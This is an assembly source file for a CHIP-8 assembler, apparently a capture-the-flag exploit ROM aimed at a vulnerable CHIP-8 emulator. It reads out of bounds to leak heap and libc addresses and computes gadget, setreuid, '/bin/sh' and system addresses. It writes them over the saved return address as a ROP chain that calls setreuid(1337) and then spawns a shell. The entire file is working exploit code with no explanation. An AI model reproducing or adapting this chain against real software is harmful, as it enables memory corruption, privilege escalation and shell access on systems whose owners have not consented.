; chipper asm
option binary
align off

; LEAK LIBC HEAP
ld I, #FFF
ld va, #1
add I, va

ld v9, #FF
ld va, #F8

add I, v9
add I, v9
add I, v9
add I, v9
add I, v9
add I, v9
add I, v9
add I, v9
add I, va

ld v7, [I]
;14

; COMP POPRSI
ld ve, #61

add v0, ve
se vf, #0
add v1, #1

; SET INDEX TO SAVED EIP

ld I, #FFF
ld ve, #1
add I, ve

ld ve, #E0

add I, v9
add I, v9
add I, v9
add I, v9
add I, v9
add I, v9
add I, v9
add I, v9
add I, ve
;14
; PUSH POPRSI
ld [I], v7

; PUSH 1337
ld ve, #08
add I, ve

ld va, v0
ld vb, #1

ld v0, #39

ld [I], v0
add I, vb

ld v0, #05

ld [I], v0
add I, vb

ld v0, #0

ld [I], v0
add I, vb
ld [I], v0
add I, vb
ld [I], v0
add I, vb
ld [I], v0
add I, vb
ld [I], v0
add I, vb
ld [I], v0
add I, vb

ld v0, va

; PUSH POPRDI
ld ve, #08
add I, ve

add v0, #2 ; No carry here. If this gives a segfault, just retry.
ld [I], v7

;2


; PUSH POP RDI

ld ve, #18
add I, ve

ld [I], v7

;3

; GET LEAK
; COMP AND PUSH EVERYTHING, AND THEN
; PUSH 1337 AT THE END

; LEAK LIBC

ld I, #FFF
ld va, #1
add I, va

ld v9, #FF

add I, v9
add I, v9
add I, v9
add I, v9
add I, v9
add I, v9
add I, v9
add I, v9
add I, v9
add I, va

ld v7, [I]

;15
; COMPUTE SETREUID
ld va, v0
ld vb, v1
ld vc, v2
ld vd, v3

ld ve, #9f

add v0, ve
se vf, #0
add v1, #1

ld ve, #0c

add v1, ve
se vf, #0
add v2, #1

ld ve, #0c

add v2, ve
se vf, #0
add v3, #1
;16
; PUSH SETREUID address
ld ve, #8
add I, ve

ld [I], v7
;1
; COMP /BIN/SH

ld v0, va
ld v1, vb
ld v2, vc
ld v3, vd

ld ve, #f8

add v0, ve
se vf, #0
add v1, #1

ld ve, #16

add v1, ve
se vf, #0
add v2, #1

ld ve, #14

add v2, ve
se vf, #0
add v3, #1

;16
; PUSH /BIN/SH

ld ve, #10
add I, ve
ld [I], v7

;3
; COMP SYSTEM
ld v0, va
ld v1, vb
ld v2, vc
ld v3, vd

ld ve, #9f

add v0, ve
se vf, #0
add v1, #1

ld ve, #f1

add v1, ve
se vf, #0
add v2, #1

ld ve, #01

add v2, ve
se vf, #0
add v3, #1

; PUSH SYSTEM
ld ve, #08
add I, ve
ld [I], v7


;  COMP EXIT
ld v0, va
ld v1, vb
ld v2, vc
ld v3, vd

ld ve, #9f

add v0, ve
se vf, #0
add v1, #1

ld ve, #56

add v1, ve
se vf, #0
add v2, #1

ld ve, #01

add v2, ve
se vf, #0
add v3, #1

; PUSH EXIT
ld ve, #08
add I, ve

ld [I], v7


; SET INDEX TO POP SECOND ARG (OLD LEAK)

ld I, #FFF
ld va, #1
add I, va

ld v9, #FF

add I, v9
add I, v9
add I, v9
add I, v9
add I, v9
add I, v9
add I, v9
add I, v9
add I, v9
add I, va

;14

; PUSH 1337
ld va, v0
ld vb, #1

ld v0, #39

ld [I], v0
add I, vb

ld v0, #05

ld [I], v0
add I, vb

ld v0, #0

ld [I], v0
add I, vb
ld [I], v0
add I, vb
ld [I], v0
add I, vb
ld [I], v0
add I, vb
ld [I], v0
add I, vb
ld [I], v0
add I, vb

ld v0, va

;22
